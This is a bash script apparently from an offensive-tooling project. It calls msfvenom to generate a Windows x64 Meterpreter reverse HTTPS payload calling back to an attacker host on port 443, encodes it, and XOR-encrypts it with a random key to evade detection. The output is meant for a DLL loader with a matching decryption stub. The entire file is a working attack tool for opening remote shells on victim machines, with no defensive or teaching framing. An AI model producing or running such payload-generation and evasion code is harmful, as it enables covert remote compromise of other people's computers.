#!/bin/bash
# scripts/generate_shellcode.sh
# Generates encoded shellcode with basic evasion techniques

# Configuration
OUTPUT_DIR="../build/linux"
PAYLOAD="windows/x64/meterpreter/reverse_https"
LHOST="192.168.1.100"     # Update with your IP
LPORT="443"
ENCODER="x64/xor_dynamic"
BAD_CHARS="\x00\x0a\x0d"  # Null, LF, CR

# Create output directory if not exists
mkdir -p "$OUTPUT_DIR"

# Check for msfvenom
if ! command -v msfvenom &> /dev/null
then
    echo "[!] msfvenom not found! Install metasploit-framework first."
    exit 1
fi

# Generate raw shellcode
echo "[*] Generating shellcode with payload $PAYLOAD"
msfvenom -p "$PAYLOAD" \
    LHOST="$LHOST" \
    LPORT="$LPORT" \
    EXITFUNC=thread \
    -f raw \
    -b "$BAD_CHARS" \
    -e "$ENCODER" \
    -o "$OUTPUT_DIR/shellcode.raw"

# XOR encrypt shellcode (basic example)
echo "[*] Applying basic XOR encryption"
KEY=$(openssl rand -hex 1)
echo "[+] Using XOR key: 0x$KEY"
echo -n "$KEY" > "$OUTPUT_DIR/shellcode.key"
echo "  - Key saved to: $OUTPUT_DIR/shellcode.key"  # Added this line

# Convert raw to hex format
xxd -p "$OUTPUT_DIR/shellcode.raw" | tr -d '\n' > "$OUTPUT_DIR/shellcode.hex"

# XOR with Python (avoids need for external compilers)
python3 - <<EOF > "$OUTPUT_DIR/shellcode.bin"
import sys
key = 0x${KEY}
with open("$OUTPUT_DIR/shellcode.hex", "r") as f:
    data = bytes.fromhex(f.read().strip())
sys.stdout.buffer.write(bytes([b ^ key for b in data]))
EOF

# Cleanup temporary files
rm "$OUTPUT_DIR/shellcode.raw" "$OUTPUT_DIR/shellcode.hex"

echo "[+] Encrypted shellcode saved to $OUTPUT_DIR/shellcode.bin"
echo "[!] Remember to update the XOR decryption stub in the DLL code!"